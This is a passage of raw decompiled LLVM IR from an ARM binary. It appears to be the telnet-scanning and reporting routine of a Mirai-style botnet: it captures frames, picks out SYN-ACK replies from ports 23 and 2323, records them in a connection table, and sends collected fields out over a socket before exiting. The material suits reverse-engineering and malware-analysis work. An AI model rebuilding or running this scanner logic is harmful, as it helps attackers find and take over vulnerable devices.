  store i1 %v8_101a0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_1019c, i32* %stack_var_-52, align 4
  %v5_101a8 = icmp slt i32 %v1_1019c, 384
  br i1 %v5_101a8, label %.thread68.dec_label_pc_fe98_crit_edge, label %dec_label_pc_101ac

.thread68.dec_label_pc_fe98_crit_edge:            ; preds = %.thread68
  %v0_fe98.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_fe98

dec_label_pc_101ac:                               ; preds = %.thread68
  %v0_101ac = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_101ac, i32* @fp, align 4
  br label %dec_label_pc_101b0

dec_label_pc_101b0:                               ; preds = %dec_label_pc_fe7c, %dec_label_pc_101ac
  %v0_101b0 = call i32* @__errno_location()
  %v2_101b0 = ptrtoint i32* %v0_101b0 to i32
  store i32 %v2_101b0, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  store i32 %v2_101b0, i32* @sb, align 4
  br label %dec_label_pc_101bc

dec_label_pc_101bc:                               ; preds = %dec_label_pc_10298, %dec_label_pc_10290, %dec_label_pc_10288, %dec_label_pc_10254, %dec_label_pc_10244, %dec_label_pc_10220, %dec_label_pc_10208, %dec_label_pc_10280, %dec_label_pc_10270, %dec_label_pc_10200, %dec_label_pc_10338, %dec_label_pc_101b0
  %v1_101c0 = phi i32 [ %v2_101b0, %dec_label_pc_101b0 ], [ %v1_101c0.pre.pre, %dec_label_pc_10338 ], [ %v0_101f4, %dec_label_pc_10200 ], [ %v0_101f4, %dec_label_pc_10270 ], [ %v0_101f4, %dec_label_pc_10280 ], [ %v0_101f4, %dec_label_pc_10208 ], [ %v0_101f4, %dec_label_pc_10220 ], [ %v0_101f4, %dec_label_pc_10244 ], [ %v0_101f4, %dec_label_pc_10254 ], [ %v0_101f4, %dec_label_pc_10288 ], [ %v0_101f4, %dec_label_pc_10290 ], [ %v0_101f4, %dec_label_pc_10298 ]
  %v2_101c0 = inttoptr i32 %v1_101c0 to i32*
  store i32 0, i32* %v2_101c0, align 4
  %v2_101cc = load i32, i32* @global_var_1a440.197, align 4
  store i32 %v2_101cc, i32* %r0.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 1514, i32* %r2.global-to-local, align 4
  store i32 %v2_fe6c, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v10_101e8 = call i32 @recvfrom(i32 %v2_101cc, i32* nonnull %stack_var_-1862, i32 1514, i32 16384, %sockaddr* null, i32* null)
  store i32 %v10_101e8, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_101ec = icmp eq i32 %v10_101e8, 0
  store i1 %v2_101ec, i1* %cpsr_z.global-to-local, align 1
  %tmp334 = icmp slt i32 %v10_101e8, 1
  br i1 %tmp334, label %dec_label_pc_10404, label %dec_label_pc_101f4

dec_label_pc_101f4:                               ; preds = %dec_label_pc_101bc
  %v0_101f4 = load i32, i32* @sb, align 4
  %v1_101f4 = inttoptr i32 %v0_101f4 to i32*
  %v2_101f4 = load i32, i32* %v1_101f4, align 4
  store i32 %v2_101f4, i32* %r3.global-to-local, align 4
  %v2_101f8 = icmp ugt i32 %v2_101f4, 10
  store i1 %v2_101f8, i1* %cpsr_c.global-to-local, align 1
  %v7_101f8 = icmp eq i32 %v2_101f4, 11
  store i1 %v7_101f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_101f8, label %dec_label_pc_10404, label %dec_label_pc_10200

dec_label_pc_10200:                               ; preds = %dec_label_pc_101f4
  %v2_10200 = icmp ugt i32 %v10_101e8, 38
  store i1 %v2_10200, i1* %cpsr_c.global-to-local, align 1
  %v7_10200 = icmp eq i32 %v10_101e8, 39
  store i1 %v7_10200, i1* %cpsr_z.global-to-local, align 1
  %v2_10204 = xor i1 %v2_10200, true
  %v3_10204 = or i1 %v7_10200, %v2_10204
  br i1 %v3_10204, label %dec_label_pc_101bc, label %dec_label_pc_10208

dec_label_pc_10208:                               ; preds = %dec_label_pc_10200
  store i32 %v2_fe6c, i32* %lr.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1a420.104 to i32), i32* %r0.global-to-local, align 4
  %v3_10210 = load i32, i32* %v2_10210, align 4
  store i32 %v3_10210, i32* %r2.global-to-local, align 4
  %v2_10214 = load i32, i32* @global_var_1a420.104, align 4
  store i32 %v2_10214, i32* %r3.global-to-local, align 4
  %v3_10218 = icmp uge i32 %v3_10210, %v2_10214
  store i1 %v3_10218, i1* %cpsr_c.global-to-local, align 1
  %v9_10218 = icmp eq i32 %v3_10210, %v2_10214
  store i1 %v9_10218, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_10218, label %dec_label_pc_10220, label %dec_label_pc_101bc

dec_label_pc_10220:                               ; preds = %dec_label_pc_10208
  %v3_10220 = load i8, i8* %v2_10220, align 1
  %v4_10220 = zext i8 %v3_10220 to i32
  store i32 %v4_10220, i32* %r3.global-to-local, align 4
  %v2_10224 = icmp ugt i8 %v3_10220, 5
  store i1 %v2_10224, i1* %cpsr_c.global-to-local, align 1
  %v7_10224 = icmp eq i8 %v3_10220, 6
  store i1 %v7_10224, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10224, label %dec_label_pc_1022c, label %dec_label_pc_101bc

dec_label_pc_1022c:                               ; preds = %dec_label_pc_10220
  store i32 %v2_fe70, i32* %r1.global-to-local, align 4
  %v2_10230 = load i8, i8* %tmp297, align 4
  %v3_10230 = zext i8 %v2_10230 to i32
  store i32 %v3_10230, i32* %r2.global-to-local, align 4
  %v3_10234 = load i8, i8* %v2_10234, align 1
  %v4_10234 = zext i8 %v3_10234 to i32
  store i32 %v4_10234, i32* %r3.global-to-local, align 4
  %v4_10238 = mul nuw nsw i32 %v4_10234, 256
  %v5_10238 = or i32 %v4_10238, %v3_10230
  store i32 %v5_10238, i32* %r2.global-to-local, align 4
  %v2_1023c = icmp ugt i32 %v5_10238, 5887
  store i1 %v2_1023c, i1* %cpsr_c.global-to-local, align 1
  %v7_1023c = icmp eq i32 %v5_10238, 5888
  store i1 %v7_1023c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1023c, label %dec_label_pc_10254, label %dec_label_pc_10244

dec_label_pc_10244:                               ; preds = %dec_label_pc_1022c
  store i32 4873, i32* %r3.global-to-local, align 4
  %v3_1024c = icmp ugt i32 %v5_10238, 4872
  store i1 %v3_1024c, i1* %cpsr_c.global-to-local, align 1
  %v9_1024c = icmp eq i32 %v5_10238, 4873
  store i1 %v9_1024c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_1024c, label %dec_label_pc_10254, label %dec_label_pc_101bc

dec_label_pc_10254:                               ; preds = %dec_label_pc_10244, %dec_label_pc_1022c
  store i32 %v2_fe70, i32* %r2.global-to-local, align 4
  %v3_10258 = load i8, i8* %v2_10258, align 2
  %v4_10258 = zext i8 %v3_10258 to i32
  store i32 %v4_10258, i32* %r3.global-to-local, align 4
  %v3_1025c = load i8, i8* %v2_1025c, align 1
  %v4_1025c = zext i8 %v3_1025c to i32
  store i32 %v4_1025c, i32* %r2.global-to-local, align 4
  store i32 %v4_fcfc, i32* %ip.global-to-local, align 4
  %v4_10264 = mul nuw nsw i32 %v4_1025c, 256
  %v5_10264 = or i32 %v4_10264, %v4_10258
  store i32 %v5_10264, i32* %r3.global-to-local, align 4
  %v3_10268 = icmp uge i32 %v5_10264, %v4_fcfc
  store i1 %v3_10268, i1* %cpsr_c.global-to-local, align 1
  %v9_10268 = icmp eq i32 %v5_10264, %v4_fcfc
  store i1 %v9_10268, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_10268, label %dec_label_pc_10270, label %dec_label_pc_101bc

dec_label_pc_10270:                               ; preds = %dec_label_pc_10254
  store i32 %v2_fe70, i32* %lr.global-to-local, align 4
  %v3_10274 = load i8, i8* %v2_10274, align 1
  %v4_10274 = zext i8 %v3_10274 to i32
  store i32 %v4_10274, i32* %r3.global-to-local, align 4
  %v1_10278 = and i32 %v4_10274, 2
  %v2_10278 = icmp eq i32 %v1_10278, 0
  store i1 %v2_10278, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10278, label %dec_label_pc_101bc, label %dec_label_pc_10280

dec_label_pc_10280:                               ; preds = %dec_label_pc_10270
  %v1_10280 = and i32 %v4_10274, 16
  %v2_10280 = icmp eq i32 %v1_10280, 0
  store i1 %v2_10280, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10280, label %dec_label_pc_101bc, label %dec_label_pc_10288

dec_label_pc_10288:                               ; preds = %dec_label_pc_10280
  %v1_10288 = and i32 %v4_10274, 4
  %v2_10288 = icmp eq i32 %v1_10288, 0
  store i1 %v2_10288, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10288, label %dec_label_pc_10290, label %dec_label_pc_101bc

dec_label_pc_10290:                               ; preds = %dec_label_pc_10288
  %tmp504 = urem i8 %v3_10274, 2
  %v2_10290 = icmp eq i8 %tmp504, 0
  store i1 %v2_10290, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10290, label %dec_label_pc_10298, label %dec_label_pc_101bc

dec_label_pc_10298:                               ; preds = %dec_label_pc_10290
  %v3_10298 = load i32, i32* %v2_10298, align 4
  %v2_102b4 = call i32 @llvm.bswap.i32(i32 %v3_10298)
  %v1_102b8 = add i32 %v2_102b4, -1
  %v1_102bc = udiv i32 %v1_102b8, 256
  %v3_102c0 = and i32 %v1_102bc, 65280
  %v1_102c4 = and i32 %v1_102b8, 65280
  store i32 %v1_102c4, i32* %r2.global-to-local, align 4
  %v3_102c8 = mul i32 %v1_102b8, 16777216
  %v4_102cc = udiv i32 %v1_102b8, 16777216
  %v5_102cc = or i32 %v3_102c0, %v4_102cc
  store i32 %v5_102cc, i32* %r1.global-to-local, align 4
  store i32 %v2_fe6c, i32* %r3.global-to-local, align 4
  %v4_102d4 = mul nuw nsw i32 %v1_102c4, 256
  %v5_102d4 = or i32 %v4_102d4, %v3_102c8
  store i32 %v5_102d4, i32* %r0.global-to-local, align 4
  %v3_102d8 = load i32, i32* %v2_102d8, align 4
  store i32 %v3_102d8, i32* %r2.global-to-local, align 4
  %v2_102dc = call i32 @llvm.bswap.i32(i32 %v1_102b8)
  store i32 %v2_102dc, i32* %ip.global-to-local, align 4
  %v3_102e0 = icmp uge i32 %v2_102dc, %v3_102d8
  store i1 %v3_102e0, i1* %cpsr_c.global-to-local, align 1
  %v9_102e0 = icmp eq i32 %v2_102dc, %v3_102d8
  store i1 %v9_102e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_102e0, label %dec_label_pc_102e8, label %dec_label_pc_101bc

dec_label_pc_102e8:                               ; preds = %dec_label_pc_10298
  %v0_102e8 = load i32, i32* @r4, align 4
  %v2_102e8 = icmp ugt i32 %v0_102e8, 254
  store i1 %v2_102e8, i1* %cpsr_c.global-to-local, align 1
  %v7_102e8 = icmp eq i32 %v0_102e8, 255
  store i1 %v7_102e8, i1* %cpsr_z.global-to-local, align 1
  %v8_102ec = icmp sgt i32 %v0_102e8, 255
  br i1 %v8_102ec, label %dec_label_pc_10404, label %dec_label_pc_102f0

dec_label_pc_102f0:                               ; preds = %dec_label_pc_102e8
  store i32 ptrtoint (i32* @global_var_1a43c.195 to i32), i32* %lr.global-to-local, align 4
  %v3_102f4 = mul i32 %v0_102e8, 256
  store i32 %v3_102f4, i32* %r2.global-to-local, align 4
  %v2_102f8 = load i32, i32* @global_var_1a43c.195, align 4
  store i32 %v2_102f8, i32* %r1.global-to-local, align 4
  %v2_10300 = mul i32 %v0_102e8, 288
  store i32 %v2_10300, i32* %r3.global-to-local, align 4
  %v2_10304 = add i32 %v2_102f8, %v2_10300
  store i32 %v2_10304, i32* @r0, align 4
  %v1_10308 = add i32 %v2_10304, 12
  %v2_10308 = inttoptr i32 %v1_10308 to i32*
  %v3_10308 = load i32, i32* %v2_10308, align 4
  store i32 %v3_10308, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1030c = icmp eq i32 %v3_10308, 0
  store i1 %v2_1030c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1030c, label %dec_label_pc_10338, label %dec_label_pc_10318.preheader

dec_label_pc_10318.preheader:                     ; preds = %dec_label_pc_102f0
  %v2_10310 = add i32 %v2_10304, 288
  store i32 %v2_10310, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10318

dec_label_pc_10318:                               ; preds = %dec_label_pc_10318.preheader, %dec_label_pc_10324
  %v0_10324 = phi i32 [ %v2_10310, %dec_label_pc_10318.preheader ], [ %v1_10330, %dec_label_pc_10324 ]
  %v0_10318 = phi i32 [ %v0_102e8, %dec_label_pc_10318.preheader ], [ %v1_10318, %dec_label_pc_10324 ]
  %v1_10318 = add i32 %v0_10318, 1
  store i32 %v1_10318, i32* @r4, align 4
  %v7_1031c = icmp eq i32 %v1_10318, 256
  br i1 %v7_1031c, label %dec_label_pc_10404.loopexit, label %dec_label_pc_10324

dec_label_pc_10324:                               ; preds = %dec_label_pc_10318
  store i32 %v0_10324, i32* @r0, align 4
  %v1_10328 = add i32 %v0_10324, 12
  %v2_10328 = inttoptr i32 %v1_10328 to i32*
  %v3_10328 = load i32, i32* %v2_10328, align 4
  %v2_1032c = icmp eq i32 %v3_10328, 0
  %v1_10330 = add i32 %v0_10324, 288
  store i32 %v1_10330, i32* %r3.global-to-local, align 4
  br i1 %v2_1032c, label %dec_label_pc_10338.loopexit, label %dec_label_pc_10318

dec_label_pc_10338.loopexit:                      ; preds = %dec_label_pc_10324
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_10338

dec_label_pc_10338:                               ; preds = %dec_label_pc_10338.loopexit, %dec_label_pc_102f0
  %v1_10338 = phi i32 [ %v0_10324, %dec_label_pc_10338.loopexit ], [ %v2_10304, %dec_label_pc_102f0 ]
  %v2_10338 = add i32 %v1_10338, 16
  %v3_10338 = inttoptr i32 %v2_10338 to i32*
  store i32 %v3_102d8, i32* %v3_10338, align 4
  store i32 %v2_fe70, i32* %r1.global-to-local, align 4
  %v2_10340 = load i32, i32* %stack_var_-1842, align 4
  store i32 %v2_10340, i32* %r2.global-to-local, align 4
  %v1_10344 = and i32 %v2_10340, 128
  %v2_10344 = icmp ne i32 %v1_10344, 0
  store i1 %v2_10344, i1* %cpsr_c.global-to-local, align 1
  %v3_10344 = sdiv i32 %v2_10340, 256
  store i32 %v3_10344, i32* %r3.global-to-local, align 4
  %v1_10348 = trunc i32 %v3_10344 to i8
  %v2_10348 = load i32, i32* @r0, align 4
  %v3_10348 = add i32 %v2_10348, 21
  %v4_10348 = inttoptr i32 %v3_10348 to i8*
  store i8 %v1_10348, i8* %v4_10348, align 1
  %v0_1034c = load i32, i32* %r2.global-to-local, align 4
  %v1_1034c = trunc i32 %v0_1034c to i8
  %v2_1034c = load i32, i32* @r0, align 4
  %v3_1034c = add i32 %v2_1034c, 20
  %v4_1034c = inttoptr i32 %v3_1034c to i8*
  store i8 %v1_1034c, i8* %v4_1034c, align 1
  %v0_10350 = call i32 @function_f8e0()
  store i32 %v0_10350, i32* %r0.global-to-local, align 4
  %v1_101c0.pre.pre = load i32, i32* @sb, align 4
  br label %dec_label_pc_101bc

dec_label_pc_10358:                               ; preds = %dec_label_pc_111f4
  store i32 %v2_10738, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10368 = load i32, i32* @r4, align 4
  store i32 %v0_10368, i32* %r0.global-to-local, align 4
  %v0_1036c = load i32, i32* @r5, align 4
  store i32 %v0_1036c, i32* %stack_var_-56, align 4
  %v6_10370 = call i32 @send(i32 %v0_10368, i32* nonnull %stack_var_-56, i32 1, i32 16384)
  store i32 %v2_10c30, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10384 = load i32, i32* @r4, align 4
  store i32 %v0_10384, i32* %r0.global-to-local, align 4
  %v5_10388 = call i32 @send(i32 %v0_10384, i32* nonnull %stack_var_-48, i32 4, i32 16384)
  %v0_10390 = load i32, i32* @r6, align 4
  store i32 %v0_10390, i32* %r2.global-to-local, align 4
  %v2_10394 = ptrtoint i32* %stack_var_-38 to i32
  store i32 %v2_10394, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_1039c = load i32, i32* @r4, align 4
  store i32 %v0_1039c, i32* %r0.global-to-local, align 4
  %v5_103a0 = call i32 @send(i32 %v0_1039c, i32* nonnull %stack_var_-38, i32 %v0_10390, i32 16384)
  %v0_103a4 = load i32, i32* %sl.global-to-local, align 4
  %v1_103a4 = add i32 %v0_103a4, 12
  store i32 %v1_103a4, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_103b0 = load i32, i32* @r4, align 4
  store i32 %v0_103b0, i32* %r0.global-to-local, align 4
  %v4_103b4 = inttoptr i32 %v1_103a4 to i32*
  %v5_103b4 = call i32 @send(i32 %v0_103b0, i32* %v4_103b4, i32 1, i32 16384)
  store i32 %v5_103b4, i32* %r0.global-to-local, align 4
  %v0_103b8 = load i32, i32* %sl.global-to-local, align 4
  %v1_103b8 = inttoptr i32 %v0_103b8 to i32*
  %v2_103b8 = load i32, i32* %v1_103b8, align 4
  store i32 %v2_103b8, i32* %r1.global-to-local, align 4
  %v1_103bc = add i32 %v0_103b8, 12
  %v2_103bc = inttoptr i32 %v1_103bc to i8*
  %v3_103bc = load i8, i8* %v2_103bc, align 1
  %v4_103bc = zext i8 %v3_103bc to i32
  store i32 %v4_103bc, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_103c4 = load i32, i32* @r4, align 4
  store i32 %v0_103c4, i32* %r0.global-to-local, align 4
  %v4_103c8 = inttoptr i32 %v2_103b8 to i32*
  %v5_103c8 = call i32 @send(i32 %v0_103c4, i32* %v4_103c8, i32 %v4_103bc, i32 16384)
  %v0_103cc = load i32, i32* %sl.global-to-local, align 4
  %v1_103cc = add i32 %v0_103cc, 13
  store i32 %v1_103cc, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_103d8 = load i32, i32* @r4, align 4
  store i32 %v0_103d8, i32* %r0.global-to-local, align 4
  %v4_103dc = inttoptr i32 %v1_103cc to i32*
  %v5_103dc = call i32 @send(i32 %v0_103d8, i32* %v4_103dc, i32 1, i32 16384)
  %v0_103e0 = load i32, i32* @r4, align 4
  store i32 %v0_103e0, i32* %r0.global-to-local, align 4
  %v0_103e4 = load i32, i32* %sl.global-to-local, align 4
  %v1_103e4 = add i32 %v0_103e4, 13
  %v2_103e4 = inttoptr i32 %v1_103e4 to i8*
  %v3_103e4 = load i8, i8* %v2_103e4, align 1
  %v4_103e4 = zext i8 %v3_103e4 to i32
  store i32 %v4_103e4, i32* %r2.global-to-local, align 4
  %v1_103e8 = add i32 %v0_103e4, 4
  %v2_103e8 = inttoptr i32 %v1_103e8 to i32*
  %v3_103e8 = load i32, i32* %v2_103e8, align 4
  store i32 %v3_103e8, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_103f0 = inttoptr i32 %v3_103e8 to i32*
  %v5_103f0 = call i32 @send(i32 %v0_103e0, i32* %v4_103f0, i32 %v4_103e4, i32 16384)
  %v0_103f4 = load i32, i32* @r4, align 4
  store i32 %v0_103f4, i32* %r0.global-to-local, align 4
  %v1_103f8 = call i32 @close(i32 %v0_103f4)
  store i32 %v1_103f8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_103fc

dec_label_pc_103fc:                               ; preds = %dec_label_pc_111d8, %dec_label_pc_fc14, %dec_label_pc_104ec, %dec_label_pc_10358
  %v0_103fc = load i32, i32* @r5, align 4
  store i32 %v0_103fc, i32* %r0.global-to-local, align 4
  call void @exit(i32 %v0_103fc)
  unreachable

dec_label_pc_10404.loopexit:                      ; preds = %dec_label_pc_10318
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_10404

dec_label_pc_10404:                               ; preds = %dec_label_pc_102e8, %dec_label_pc_101f4, %dec_label_pc_101bc, %dec_label_pc_10404.loopexit
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 1664, i32* %ip.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v2_10418451 = load i32, i32* %sp.global-to-local, align 4
  %v3_10418452 = add i32 %v2_10418451, 1664
  %v4_10418453 = inttoptr i32 %v3_10418452 to i32*
  store i32 0, i32* %v4_10418453, align 4
  br label %dec_label_pc_1040c.dec_label_pc_1040c_crit_edge

dec_label_pc_1040c.dec_label_pc_1040c_crit_edge:  ; preds = %dec_label_pc_10404, %dec_label_pc_1040c.dec_label_pc_1040c_crit_edge
  %v0_1040c.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_10418.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1040c = add i32 %v0_1040c.pre, 1664
  store i32 %v1_1040c, i32* %ip.global-to-local, align 4
  %v1_10410 = add i32 %v0_1040c.pre, 4
  store i32 %v1_10410, i32* %r3.global-to-local, align 4
  %v7_10414 = icmp eq i32 %v1_10410, 128
  %v2_10418 = load i32, i32* %sp.global-to-local, align 4
  %v3_10418 = add i32 %v2_10418, %v1_1040c
  %v4_10418 = inttoptr i32 %v3_10418 to i32*
  store i32 %v0_10418.pre, i32* %v4_10418, align 4
  br i1 %v7_10414, label %dec_label_pc_10420, label %dec_label_pc_1040c.dec_label_pc_1040c_crit_edge

dec_label_pc_10420:                               ; preds = %dec_label_pc_1040c.dec_label_pc_1040c_crit_edge
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_10420 = load i32, i32* %r2.global-to-local, align 4
  %v1_10424454 = add i32 %v0_10420, 1536
  store i32 %v1_10424454, i32* %lr.global-to-local, align 4
  %v1_10428455 = add i32 %v0_10420, 4
  store i32 %v1_10428455, i32* %r3.global-to-local, align 4
  %v7_1042c456 = icmp eq i32 %v1_10428455, 128
  %v2_10430457 = load i32, i32* %sp.global-to-local, align 4
  %v3_10430458 = add i32 %v2_10430457, %v1_10424454
  %v4_10430459 = inttoptr i32 %v3_10430458 to i32*
  store i32 %v0_10420, i32* %v4_10430459, align 4
  br i1 %v7_1042c456, label %dec_label_pc_10438, label %dec_label_pc_10424.dec_label_pc_10424_crit_edge

dec_label_pc_10424.dec_label_pc_10424_crit_edge:  ; preds = %dec_label_pc_10420, %dec_label_pc_10424.dec_label_pc_10424_crit_edge
  %v0_10424.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_10430.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_10424 = add i32 %v0_10424.pre, 1536
  store i32 %v1_10424, i32* %lr.global-to-local, align 4
  %v1_10428 = add i32 %v0_10424.pre, 4
  store i32 %v1_10428, i32* %r3.global-to-local, align 4
  %v7_1042c = icmp eq i32 %v1_10428, 128
  %v2_10430 = load i32, i32* %sp.global-to-local, align 4
  %v3_10430 = add i32 %v2_10430, %v1_10424
  %v4_10430 = inttoptr i32 %v3_10430 to i32*
  store i32 %v0_10430.pre, i32* %v4_10430, align 4
  br i1 %v7_1042c, label %dec_label_pc_10438, label %dec_label_pc_10424.dec_label_pc_10424_crit_edge

dec_label_pc_10438:                               ; preds = %dec_label_pc_10424.dec_label_pc_10424_crit_edge, %dec_label_pc_10420
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_10438 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_10438, i32* @r6, align 4
  store i32 %v0_10438, i32* @r5, align 4
  store i32 %v0_10438, i32* @r7, align 4
  store i32 %v0_10438, i32* %stack_var_-52, align 4
  br label %dec_label_pc_104b4

dec_label_pc_1044c:                               ; preds = %dec_label_pc_104dc, %dec_label_pc_104b4
  %storemerge245 = phi i32 [ 30, %dec_label_pc_104b4 ], [ 5, %dec_label_pc_104dc ]
  store i32 %storemerge245, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1a41c.182 to i32), i32* %r2.global-to-local, align 4
  %v2_10450 = load i32, i32* @global_var_1a41c.182, align 4
  store i32 %v2_10450, i32* %r3.global-to-local, align 4
  %v1_10454 = add i32 %v2_104c8, 8
  %v2_10454 = inttoptr i32 %v1_10454 to i32*
  %v3_10454 = load i32, i32* %v2_10454, align 4
  store i32 %v3_10454, i32* %r2.global-to-local, align 4
  %v2_10458 = sub i32 %v2_10450, %v3_10454
  store i32 %v2_10458, i32* %r3.global-to-local, align 4
  %v3_1045c = icmp uge i32 %v2_10458, %storemerge245
  store i1 %v3_1045c, i1* %cpsr_c.global-to-local, align 1
  %v9_1045c = icmp eq i32 %v2_10458, %storemerge245
  store i1 %v9_1045c, i1* %cpsr_z.global-to-local, align 1
  %v2_10460 = xor i1 %v9_1045c, true
  %v3_10460 = and i1 %v3_1045c, %v2_10460
  br i1 %v3_10460, label %dec_label_pc_10530, label %dec_label_pc_10464

dec_label_pc_10464:                               ; preds = %dec_label_pc_1044c
  store i1 %v2_104d0, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_104d0, i1* %cpsr_z.global-to-local, align 1
  %v1_104fc = add i32 %v2_104c8, 4
  %v2_104fc = inttoptr i32 %v1_104fc to i32*
  %v3_104fc = load i32, i32* %v2_104fc, align 4
  br i1 %v7_104d0, label %dec_label_pc_104fc, label %dec_label_pc_1046c

dec_label_pc_1046c:                               ; preds = %dec_label_pc_10464
  store i32 %v3_104fc, i32* %ip.global-to-local, align 4
  %v3_10474 = udiv i32 %v3_104fc, 32
  store i32 %v2_1050c, i32* %r0.global-to-local, align 4
  %v3_1047c = mul nuw nsw i32 %v3_10474, 4
  %v2_10480 = add i32 %v3_1047c, %v2_1050c
  store i32 %v2_10480, i32* %r3.global-to-local, align 4
  %v1_10484 = add i32 %v2_10480, -184
  %v2_10484 = inttoptr i32 %v1_10484 to i32*
  %v3_10484 = load i32, i32* %v2_10484, align 4
  %v1_10488 = urem i32 %v3_104fc, 32
  store i32 %v1_10488, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v7_10490 = shl i32 1, %v1_10488
  %v8_10490 = or i32 %v3_10484, %v7_10490
  store i32 %v8_10490, i32* %r2.global-to-local, align 4
  store i32 %v8_10490, i32* %v2_10484, align 4
  %v0_10498 = load i32, i32* @r6, align 4
  %v1_10498 = load i32, i32* %ip.global-to-local, align 4
  %v3_10498 = icmp uge i32 %v0_10498, %v1_10498
  store i1 %v3_10498, i1* %cpsr_c.global-to-local, align 1
  %v9_10498 = icmp eq i32 %v0_10498, %v1_10498
  store i1 %v9_10498, i1* %cpsr_z.global-to-local, align 1
  %v5_1049c = icmp slt i32 %v0_10498, %v1_10498
  br i1 %v5_1049c, label %bb336, label %bb337

bb336:                                            ; preds = %dec_label_pc_1046c
  store i32 %v1_10498, i32* @r6, align 4
  br label %bb337

bb337:                                            ; preds = %dec_label_pc_104dc, %dec_label_pc_10570, %dec_label_pc_10564, %bb339, %dec_label_pc_1046c, %bb336
  %v3_104a0 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_104a0, i32* %r3.global-to-local, align 4
  %v1_104a4 = add i32 %v3_104a0, 1
  store i32 %v1_104a4, i32* %r2.global-to-local, align 4
  %v2_104a8 = icmp ugt i32 %v1_104a4, 254
  store i1 %v2_104a8, i1* %cpsr_c.global-to-local, align 1
  %v7_104a8 = icmp eq i32 %v1_104a4, 255
  store i1 %v7_104a8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_104a4, i32* %stack_var_-52, align 4
  %v8_104b0 = icmp sgt i32 %v1_104a4, 255
  br i1 %v8_104b0, label %dec_label_pc_1057c, label %dec_label_pc_104b4

dec_label_pc_104b4:                               ; preds = %bb337, %dec_label_pc_10438
  %v0_104c0 = phi i32 [ %v1_104a4, %bb337 ], [ %v0_10438, %dec_label_pc_10438 ]
  store i32 ptrtoint (i32* @global_var_1a43c.195 to i32), i32* %r0.global-to-local, align 4
  %v3_104b8 = mul i32 %v0_104c0, 256
  store i32 %v3_104b8, i32* %r3.global-to-local, align 4
  %v2_104bc = load i32, i32* @global_var_1a43c.195, align 4
  store i32 %v2_104bc, i32* %r1.global-to-local, align 4
  %v2_104c4 = mul i32 %v0_104c0, 288
  store i32 %v2_104c4, i32* %r2.global-to-local, align 4
  %v2_104c8 = add i32 %v2_104bc, %v2_104c4
  store i32 %v2_104c8, i32* @r4, align 4
  %v1_104cc = add i32 %v2_104c8, 12
  %v2_104cc = inttoptr i32 %v1_104cc to i32*
  %v3_104cc = load i32, i32* %v2_104cc, align 4
  store i32 %v3_104cc, i32* %ip.global-to-local, align 4
  %v2_104d0 = icmp ne i32 %v3_104cc, 0
  store i1 %v2_104d0, i1* %cpsr_c.global-to-local, align 1
  %v7_104d0 = icmp eq i32 %v3_104cc, 1
  store i1 %v7_104d0, i1* %cpsr_z.global-to-local, align 1
  %v2_104d4 = xor i1 %v7_104d0, true
  %v3_104d4 = and i1 %v2_104d0, %v2_104d4
  br i1 %v3_104d4, label %dec_label_pc_1044c, label %dec_label_pc_104dc

dec_label_pc_104dc:                               ; preds = %dec_label_pc_104b4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
